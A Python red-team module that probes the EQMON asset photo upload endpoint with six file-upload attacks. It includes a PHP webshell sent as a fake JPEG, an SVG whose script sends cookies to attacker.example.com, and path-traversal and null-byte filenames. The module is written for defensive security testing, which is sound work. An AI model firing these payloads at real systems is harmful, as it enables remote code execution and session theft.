"""File upload abuse attacks against the EQMON asset photo endpoint."""

import time
import uuid

import aiohttp

from redteam.base import Attack, AttackResult, Severity, Status

# Real endpoint discovered in /var/www/html/eqmon/api/admin/asset-photos.php
# POST multipart/form-data with fields: action=upload, asset_id=<id>, photo=<file>
# Server validates MIME via finfo (magic bytes), enforces 10MB limit.
# Allowed MIME types: image/jpeg, image/png, image/webp
UPLOAD_PATH = "/api/admin/asset-photos.php"

# Minimal valid JPEG (1x1 pixel) — passes finfo MIME detection
_TINY_JPEG = (
    b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
    b"\xff\xdb\x00C\x00\x08\x06\x06\x07\x06\x05\x08\x07\x07\x07\t\t"
    b"\x08\n\x0c\x14\r\x0c\x0b\x0b\x0c\x19\x12\x13\x0f\x14\x1d\x1a"
    b"\x1f\x1e\x1d\x1a\x1c\x1c $.' \",#\x1c\x1c(7),01444\x1f'9=82<.342\x1c"
    b"\xc4\x00\x1f\x00\x00\x01\x05\x01\x01\x01\x01\x01\x01\x00\x00\x00"
    b"\x00\x00\x00\x00\x00\x01\x02\x03\x04\x05\x06\x07\x08\t\n\x0b"
    b"\xff\xc4\x00\xb5\x10\x00\x02\x01\x03\x03\x02\x04\x03\x05\x05\x04"
    b"\x04\x00\x00\x01}\x01\x02\x03\x00\x04\x11\x05\x12!1A\x06\x13Qa"
    b"\x07\"q\x142\x81\x91\xa1\x08#B\xb1\xc1\x15R\xd1\xf0$3br"
    b"\x82\t\n\x16\x17\x18\x19\x1a%&'()*456789:CDEFGHIJ"
    b"STUVWXYZ\xff\xda\x00\x08\x01\x01\x00\x00?\x00\xfb\xd0\x00\x00"
    b"\xff\xd9"
)

# Minimal valid PNG (1x1 red pixel) — passes finfo MIME detection
_TINY_PNG = (
    b"\x89PNG\r\n\x1a\n"
    b"\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02"
    b"\x00\x00\x00\x90wS\xde\x00\x00\x00\x0cIDATx\x9cc\xf8\x0f\x00"
    b"\x00\x01\x01\x00\x05\x18\xd8N\x00\x00\x00\x00IEND\xaeB`\x82"
)

# SVG with embedded JS — not a valid image, but SVG is often treated as one
_SVG_XSS = b"""<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <script type="text/javascript">
    document.cookie = 'REDTEAM_XSS=1; SameSite=None';
    fetch('https://attacker.example.com/steal?c=' + document.cookie);
  </script>
  <rect width="100" height="100" fill="red"/>
</svg>
""".lstrip()


async def _post_multipart(client, path: str, fields: dict, file_field: str,
                           filename: str, file_data: bytes,
                           content_type: str = "image/jpeg") -> tuple:
    """
    Send a multipart/form-data POST using the client's base URL + session cookies.

    The standard RedTeamClient.post() only supports JSON or raw bodies, so we use
    aiohttp directly here, borrowing the session's base_url and cookies.

    Returns (status_code, body_str, response_headers_dict).
    """
    base_url = client.base_url.rstrip("/")
    url = base_url + path

    # Grab cookies from the underlying aiohttp session if available
    cookies = {}
    if hasattr(client, "_session") and client._session is not None:
        jar = client._session.cookie_jar
        for cookie in jar:
            cookies[cookie.key] = cookie.value
    elif hasattr(client, "cookies"):
        cookies = dict(client.cookies)

    # Build auth headers the same way the client does
    extra_headers = {}
    if hasattr(client, "_auth_headers"):
        extra_headers = dict(client._auth_headers)

    timeout = aiohttp.ClientTimeout(total=30)
    connector = aiohttp.TCPConnector(ssl=False)

    async with aiohttp.ClientSession(
        connector=connector,
        timeout=timeout,
        cookies=cookies,
    ) as session:
        form = aiohttp.FormData()
        for key, value in fields.items():
            form.add_field(key, str(value))
        form.add_field(
            file_field,
            file_data,
            filename=filename,
            content_type=content_type,
        )

        try:
            async with session.post(url, data=form, headers=extra_headers,
                                    allow_redirects=True) as resp:
                body = await resp.text(errors="replace")
                return resp.status, body, dict(resp.headers)
        except aiohttp.ClientConnectorError as exc:
            return 0, f"Connection error: {exc}", {}
        except Exception as exc:
            return 0, f"Request error: {exc}", {}


class FileUploadAttack(Attack):
    name = "api.file_upload"
    category = "api"
    severity = Severity.HIGH
    description = (
        "File upload abuse: path traversal filenames, double extensions, "
        "content-type mismatch, oversized payloads, SVG XSS, null-byte filename tricks"
    )

    # A placeholder asset_id; the endpoint will 404 on asset lookup if it doesn't
    # exist for this instance, but we still get past (or test) the file-validation
    # layer.  We use a deterministic UUID so results are reproducible.
    _TEST_ASSET_ID = "00000000-0000-0000-0000-000000000001"

    def _classify_upload_response(self, status: int, body: str) -> Status:
        """
        Classify the server's response to an upload attempt.

        200 + 'success':true  → VULNERABLE (file accepted)
        200 + error           → PARTIAL  (file reached PHP but was rejected with info)
        400 + 'Invalid file'  → DEFENDED
        400 + other           → PARTIAL  (rejected but may leak details)
        401 / 403             → DEFENDED (auth gate, not upload flaw)
        404                   → DEFENDED (endpoint or asset not found)
        413                   → DEFENDED (size limit enforced at HTTP layer)
        500                   → PARTIAL  (server error — may indicate processing crash)
        """
        body_lower = body.lower()

        if status == 0:
            return Status.ERROR

        if status in (401, 403):
            return Status.DEFENDED

        if status == 404:
            return Status.DEFENDED

        if status == 413:
            return Status.DEFENDED

        if status == 200:
            if '"success":true' in body or '"success": true' in body:
                return Status.VULNERABLE
            # Accepted request but returned an error — might leak info
            return Status.PARTIAL

        if status == 400:
            # Clean rejection messages are DEFENDED; vague/leaky ones are PARTIAL
            defended_phrases = [
                "invalid file type",
                "file too large",
                "invalid upload",
                "photo file is required",
                "asset_id is required",
                "asset not found",
            ]
            if any(p in body_lower for p in defended_phrases):
                return Status.DEFENDED
            return Status.PARTIAL

        if status == 500:
            return Status.PARTIAL

        return Status.PARTIAL

    # ------------------------------------------------------------------
    # Variant 1 — path_traversal
    # ------------------------------------------------------------------
    async def _test_path_traversal(self, client) -> AttackResult:
        """
        Upload a valid JPEG image but with a filename containing path traversal
        sequences.  A vulnerable server would store the file outside the intended
        upload directory.  The server stores files under a UUID it generates
        itself, so the original_filename is only stored in the DB — but a naive
        implementation might use the client-supplied name for disk storage.
        """
        t0 = time.monotonic()
        traversal_filename = "../../etc/passwd.jpg"
        test_id = uuid.uuid4().hex[:8]

        status, body, headers = await _post_multipart(
            client,
            UPLOAD_PATH,
            fields={"action": "upload", "asset_id": self._TEST_ASSET_ID},
            file_field="photo",
            filename=traversal_filename,
            file_data=_TINY_JPEG,
            content_type="image/jpeg",
        )
        duration = (time.monotonic() - t0) * 1000

        upload_status = self._classify_upload_response(status, body)

        # Extra check: if accepted, was the traversal filename echoed back?
        traversal_in_response = traversal_filename in body or "passwd" in body.lower()
        if upload_status == Status.VULNERABLE and traversal_in_response:
            details = (
                "Server accepted upload with path traversal filename "
                f"'{traversal_filename}' and echoed it back. "
                "original_filename is stored verbatim in the DB and returned to clients — "
                "a UI rendering it unsanitised could expose the traversal string."
            )
        elif upload_status == Status.VULNERABLE:
            details = (
                f"Server accepted upload with traversal filename '{traversal_filename}'. "
                "File storage uses a server-generated UUID so disk traversal is blocked, "
                "but the original filename is persisted to DB without sanitisation."
            )
        else:
            details = (
                f"Upload with path traversal filename '{traversal_filename}' was rejected "
                f"(HTTP {status}). Server generates its own UUID-based storage name, "
                "providing strong protection against disk traversal."
            )

        return self._make_result(
            variant="path_traversal",
            status=upload_status,
            severity=Severity.HIGH,
            evidence=f"HTTP {status} | Body: {body[:300]}",
            details=details,
            request={
                "path": UPLOAD_PATH,
                "fields": {"action": "upload", "asset_id": self._TEST_ASSET_ID},
                "filename": traversal_filename,
                "content_type": "image/jpeg",
                "file_size": len(_TINY_JPEG),
            },
            response={"status": status, "body": body[:400]},
            duration_ms=duration,
        )

    # ------------------------------------------------------------------
    # Variant 2 — double_extension
    # ------------------------------------------------------------------
    async def _test_double_extension(self, client) -> AttackResult:
        """
        Upload a file named 'shell.php.jpg' or 'shell.php%00.jpg' to try to
        bypass extension-based allowlists.  The EQMON server uses finfo magic-byte
        detection rather than extension checks, so extension tricks should be
        ineffective — but we verify that assumption.
        """
        t0 = time.monotonic()

        # Two sub-cases: double extension and null-byte truncation in filename
        results_raw = []
        for filename, label in [
            ("shell.php.jpg", "double_ext"),
            ("shell.php\x00.jpg", "null_truncation"),
        ]:
            status, body, headers = await _post_multipart(
                client,
                UPLOAD_PATH,
                fields={"action": "upload", "asset_id": self._TEST_ASSET_ID},
                file_field="photo",
                filename=filename,
                file_data=_TINY_JPEG,
                content_type="image/jpeg",
            )
            results_raw.append((label, filename, status, body))

        duration = (time.monotonic() - t0) * 1000

        # Evaluate worst case
        worst_status = Status.DEFENDED
        evidence_parts = []
        for label, filename, status, body in results_raw:
            s = self._classify_upload_response(status, body)
            evidence_parts.append(f"{label}: HTTP {status} ({s.value})")
            if s == Status.VULNERABLE:
                worst_status = Status.VULNERABLE
            elif s == Status.PARTIAL and worst_status == Status.DEFENDED:
                worst_status = Status.PARTIAL

        if worst_status == Status.VULNERABLE:
            details = (
                "Server accepted a file with a double or null-byte-truncated extension. "
                "If the stored file is ever executed (e.g. served from a PHP-enabled "
                "directory), this could allow remote code execution."
            )
        else:
            details = (
                "Double extension and null-byte truncation attempts were rejected or "
                "the server's finfo-based MIME detection correctly identified the content "
                "regardless of the client-supplied filename."
            )

        return self._make_result(
            variant="double_extension",
            status=worst_status,
            severity=Severity.CRITICAL,
            evidence=" | ".join(evidence_parts),
            details=details,
            request={
                "filenames_tested": [r[1] for r in results_raw],
                "content_type": "image/jpeg",
                "file_content": "valid JPEG magic bytes",
            },
            response={"results": [{r[0]: r[2]} for r in results_raw]},
            duration_ms=duration,
        )

    # ------------------------------------------------------------------
    # Variant 3 — content_type_mismatch
    # ------------------------------------------------------------------
    async def _test_content_type_mismatch(self, client) -> AttackResult:
        """
        Send PHP/JavaScript content with Content-Type: image/jpeg.
        The server uses finfo on the tmp file to detect real MIME type,
        so the Content-Type header should be irrelevant — we verify this.
        """
        t0 = time.monotonic()

        php_webshell = b"<?php system($_GET['cmd']); ?>"

        status, body, headers = await _post_multipart(
            client,
            UPLOAD_PATH,
            fields={"action": "upload", "asset_id": self._TEST_ASSET_ID},
            file_field="photo",
            filename="image.jpg",
            file_data=php_webshell,
            content_type="image/jpeg",  # Lie about content type
        )
        duration = (time.monotonic() - t0) * 1000

        upload_status = self._classify_upload_response(status, body)

        if upload_status == Status.VULNERABLE:
            details = (
                "CRITICAL: Server accepted a PHP webshell with a spoofed image/jpeg "
                "Content-Type header.  The server is relying on client-supplied content "
                "type rather than finfo magic-byte detection. "
                "Stored file may be executable as PHP."
            )
        elif upload_status == Status.PARTIAL:
            details = (
                f"Server returned HTTP {status} for PHP content with spoofed content-type. "
                "The response contains unexpected details — review evidence."
            )
        else:
            details = (
                "Server correctly rejected PHP content despite spoofed image/jpeg "
                "Content-Type header. finfo-based magic-byte validation is working."
            )

        return self._make_result(
            variant="content_type_mismatch",
            status=upload_status,
            severity=Severity.CRITICAL,
            evidence=f"HTTP {status} | Body: {body[:300]}",
            details=details,
            request={
                "path": UPLOAD_PATH,
                "filename": "image.jpg",
                "declared_content_type": "image/jpeg",
                "actual_content": "PHP webshell: <?php system($_GET['cmd']); ?>",
                "file_size": len(php_webshell),
            },
            response={"status": status, "body": body[:400]},
            duration_ms=duration,
        )

    # ------------------------------------------------------------------
    # Variant 4 — oversized_file
    # ------------------------------------------------------------------
    async def _test_oversized_file(self, client) -> AttackResult:
        """
        Send a payload larger than the server's 10MB limit (we use 11MB).
        The JPEG magic bytes are prepended so finfo would pass if the size
        check were absent; we want to confirm the 10MB guard fires.
        """
        t0 = time.monotonic()

        # 11 MB: real JPEG header + padding
        oversized_data = _TINY_JPEG + (b"\xff" * (11 * 1024 * 1024))

        status, body, headers = await _post_multipart(
            client,
            UPLOAD_PATH,
            fields={"action": "upload", "asset_id": self._TEST_ASSET_ID},
            file_field="photo",
            filename="large_photo.jpg",
            file_data=oversized_data,
            content_type="image/jpeg",
        )
        duration = (time.monotonic() - t0) * 1000

        upload_status = self._classify_upload_response(status, body)

        # A 413 from nginx/Apache before PHP is still DEFENDED
        if status == 413:
            upload_status = Status.DEFENDED

        if upload_status == Status.VULNERABLE:
            details = (
                f"Server accepted an {len(oversized_data) // (1024*1024)}MB file "
                "exceeding the stated 10MB limit. This could enable storage exhaustion "
                "or DoS attacks against the upload directory."
            )
        elif upload_status == Status.PARTIAL:
            details = (
                f"Server returned HTTP {status} for {len(oversized_data) // (1024*1024)}MB "
                "upload. Response may contain useful diagnostic information."
            )
        else:
            details = (
                f"Server correctly rejected {len(oversized_data) // (1024*1024)}MB upload "
                f"(HTTP {status}). 10MB size limit is enforced."
            )

        return self._make_result(
            variant="oversized_file",
            status=upload_status,
            severity=Severity.MEDIUM,
            evidence=f"HTTP {status} | Body: {body[:300]}",
            details=details,
            request={
                "path": UPLOAD_PATH,
                "filename": "large_photo.jpg",
                "content_type": "image/jpeg",
                "file_size_bytes": len(oversized_data),
                "file_size_mb": round(len(oversized_data) / (1024 * 1024), 1),
                "server_limit_mb": 10,
            },
            response={"status": status, "body": body[:400]},
            duration_ms=duration,
        )

    # ------------------------------------------------------------------
    # Variant 5 — svg_xss
    # ------------------------------------------------------------------
    async def _test_svg_xss(self, client) -> AttackResult:
        """
        Upload an SVG file containing embedded JavaScript.  SVG is XML and
        browsers execute <script> tags inside SVGs served with image/svg+xml.
        The EQMON server's allowlist excludes SVG (only jpeg/png/webp pass),
        but the multipart can declare image/jpeg to try to sneak it through.

        Two attempts:
          a) Honest content-type: image/svg+xml  (should be rejected cleanly)
          b) Spoofed content-type: image/jpeg   (relies on finfo detecting SVG != JPEG)
        """
        t0 = time.monotonic()

        results_raw = []
        for ct, label in [
            ("image/svg+xml", "svg_honest_ct"),
            ("image/jpeg",    "svg_spoofed_jpeg_ct"),
        ]:
            status, body, headers = await _post_multipart(
                client,
                UPLOAD_PATH,
                fields={"action": "upload", "asset_id": self._TEST_ASSET_ID},
                file_field="photo",
                filename=f"xss_{label}.svg",
                file_data=_SVG_XSS,
                content_type=ct,
            )
            results_raw.append((label, ct, status, body))

        duration = (time.monotonic() - t0) * 1000

        worst_status = Status.DEFENDED
        evidence_parts = []
        for label, ct, status, body in results_raw:
            s = self._classify_upload_response(status, body)
            evidence_parts.append(f"{label} (ct={ct}): HTTP {status} ({s.value})")
            if s == Status.VULNERABLE:
                worst_status = Status.VULNERABLE
            elif s == Status.PARTIAL and worst_status == Status.DEFENDED:
                worst_status = Status.PARTIAL

        if worst_status == Status.VULNERABLE:
            details = (
                "Server accepted an SVG file containing embedded JavaScript. "
                "When this file is served back to users via the photo-serve endpoint "
                "with image/svg+xml content-type, browsers will execute the script, "
                "enabling stored XSS and session cookie theft."
            )
        else:
            details = (
                "SVG upload attempts were rejected. "
                "Server's finfo MIME detection correctly identified SVG content "
                "as neither JPEG, PNG, nor WebP."
            )

        return self._make_result(
            variant="svg_xss",
            status=worst_status,
            severity=Severity.HIGH,
            evidence=" | ".join(evidence_parts),
            details=details,
            request={
                "path": UPLOAD_PATH,
                "content": "SVG with <script>document.cookie exfil</script>",
                "attempts": [{"label": r[0], "content_type": r[1]} for r in results_raw],
            },
            response={"results": [{r[0]: {"status": r[2], "body": r[3][:200]}} for r in results_raw]},
            duration_ms=duration,
        )

    # ------------------------------------------------------------------
    # Variant 6 — null_byte_filename
    # ------------------------------------------------------------------
    async def _test_null_byte_filename(self, client) -> AttackResult:
        """
        Send a filename containing a null byte: 'photo\x00.php'.
        In older PHP / C-backed file functions the null byte truncates the
        string, so the stored name becomes 'photo' (no extension) or 'photo.php'.
        PHP 5.3+ raises a warning and modern PHP rejects null bytes in file
        paths, but the original_filename is stored verbatim in the DB and
        returned to callers — worth confirming it is sanitised.
        """
        t0 = time.monotonic()

        null_filename = "photo\x00.php"

        status, body, headers = await _post_multipart(
            client,
            UPLOAD_PATH,
            fields={"action": "upload", "asset_id": self._TEST_ASSET_ID},
            file_field="photo",
            filename=null_filename,
            file_data=_TINY_JPEG,
            content_type="image/jpeg",
        )
        duration = (time.monotonic() - t0) * 1000

        upload_status = self._classify_upload_response(status, body)

        # Additional check: did the null byte or truncated name appear in response?
        null_leaked = "\x00" in body
        php_in_name = ".php" in body

        if upload_status == Status.VULNERABLE and php_in_name:
            details = (
                "Server accepted upload with null-byte filename and echoed '.php' extension. "
                "If the stored name is used in any server-side path operation the null byte "
                "could truncate the extension check, potentially enabling PHP execution."
            )
        elif upload_status == Status.VULNERABLE:
            details = (
                "Server accepted upload with null-byte filename. "
                "The file content is a valid JPEG so storage is safe, but "
                "the original_filename may be stored with the null byte, "
                "potentially causing issues in downstream processing."
            )
        elif null_leaked:
            details = (
                f"HTTP {status}: Server response contains a null byte from the filename — "
                "the raw filename may be reflected without sanitisation."
            )
            upload_status = Status.PARTIAL
        else:
            details = (
                f"Upload with null-byte filename was rejected (HTTP {status}). "
                "PHP's upload handling stripped or rejected the null byte."
            )

        return self._make_result(
            variant="null_byte_filename",
            status=upload_status,
            severity=Severity.HIGH,
            evidence=f"HTTP {status} | null_leaked={null_leaked} | php_in_response={php_in_name} | Body: {body[:300]}",
            details=details,
            request={
                "path": UPLOAD_PATH,
                "filename": repr(null_filename),
                "content_type": "image/jpeg",
                "file_content": "valid JPEG magic bytes",
            },
            response={"status": status, "body": body[:400]},
            duration_ms=duration,
        )

    # ------------------------------------------------------------------
    # execute
    # ------------------------------------------------------------------
    async def execute(self, client) -> list[AttackResult]:
        results = []

        # Probe endpoint reachability first using client's own post()
        t0 = time.monotonic()
        probe_status, probe_body, _ = await client.post(
            UPLOAD_PATH,
            json_body={"action": "upload"},
        )
        probe_duration = (time.monotonic() - t0) * 1000

        # 404 means endpoint is gone / not exposed — mark all variants DEFENDED
        if probe_status == 404:
            for variant in (
                "path_traversal",
                "double_extension",
                "content_type_mismatch",
                "oversized_file",
                "svg_xss",
                "null_byte_filename",
            ):
                results.append(self._make_result(
                    variant=variant,
                    status=Status.DEFENDED,
                    severity=self.severity,
                    evidence=f"Endpoint probe returned HTTP 404",
                    details=(
                        f"Upload endpoint {UPLOAD_PATH} not found (HTTP 404). "
                        "File upload attack surface is not exposed."
                    ),
                    request={"path": UPLOAD_PATH, "probe": "POST json action=upload"},
                    response={"status": probe_status, "body": probe_body[:200]},
                    duration_ms=probe_duration,
                ))
            return results

        # Run all variants
        results.append(await self._test_path_traversal(client))
        results.append(await self._test_double_extension(client))
        results.append(await self._test_content_type_mismatch(client))
        results.append(await self._test_oversized_file(client))
        results.append(await self._test_svg_xss(client))
        results.append(await self._test_null_byte_filename(client))

        return results

    async def cleanup(self, client) -> None:
        """
        No persistent artifacts: all uploads target a non-existent asset_id,
        so they are rejected before any DB record or file is written.
        If a future test asset_id is used, add DELETE calls here.
        """
        pass
